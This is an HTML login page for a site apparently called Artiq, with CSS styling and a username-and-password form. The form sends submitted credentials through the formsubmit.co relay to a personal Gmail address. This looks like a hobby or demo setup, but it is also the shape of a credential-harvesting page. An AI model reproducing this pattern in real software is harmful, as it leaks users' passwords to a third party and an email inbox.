<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In - Artiq</title>
    <style> 
        @import url('https://fonts.googleapis.com/css2?family=Verdana&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Verdana', 'Geneva', 'Tahoma', sans-serif;
            color: black;
        }

        :root {
            --primary-color: #009970;
            --background-color: whitesmoke;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: var(--background-color);
        }

        form {
            background-color: white;
            padding: 40px 60px;
            text-align: center;
            display: flex;
            flex-direction: column;
            border-radius: 16px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 320px;
        }

        form h2 {
            color: var(--primary-color);
            font-weight: 500;
            text-transform: uppercase;
            font-size: 1.5em;
            letter-spacing: .1em;
            margin-bottom: 30px;
        }

        .inputBox {
            position: relative;
            margin-bottom: 30px;
        }

        .inputBox input {
            width: 100%;
            padding: 10px;
            background: transparent;
            border: 2px solid #ccc;
            border-radius: 8px;
            outline: none;
            color: #333;
            font-size: 1em;
        }

        .inputBox label {
            position: absolute;
            top: 10px;
            left: 15px;
            pointer-events: none;
            color: #999;
            transition: 0.3s ease-in-out;
            background: white;
            padding: 0 5px;
        }

        .inputBox input:focus ~ label,
        .inputBox input:valid ~ label {
            top: -10px;
            left: 10px;
            color: var(--primary-color);
            font-size: 0.85em;
        }

        .inputBox input:focus,
        .inputBox input:valid {
            border-color: var(--primary-color);
        }

        .inputBox input[type="submit"] {
            background: var(--primary-color);
            border: none;
            padding: 12px;
            border-radius: 8px;
            color: white;
            font-size: 1em;
            text-transform: none;
            letter-spacing: 0.1em;
            cursor: pointer;
            transition: 0.3s;
        }

        .inputBox input[type="submit"]:hover {
            background: #007a58;
        }

        form p {
            color: #666;
            margin-top: 20px;
        }

        form p a {
            color: var(--primary-color);
            font-weight: 500;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <form action="https://formsubmit.co/montesa.elaine@gmail.com" method="POST">
        <h2>Log In Account</h2>
        <div class="inputBox">
            <input type="text" name="username" required>
            <label>Username</label>
        </div>
        <div class="inputBox">
            <input type="password" name="password" required>
            <label>Password</label>
        </div>
        <div class="inputBox">
            <input type="submit" value="Log In">
        </div>
        <p> Don't have an Account yet? <a href="signup.html">Sign Up</a></p>
    </form>
</body>
</html>
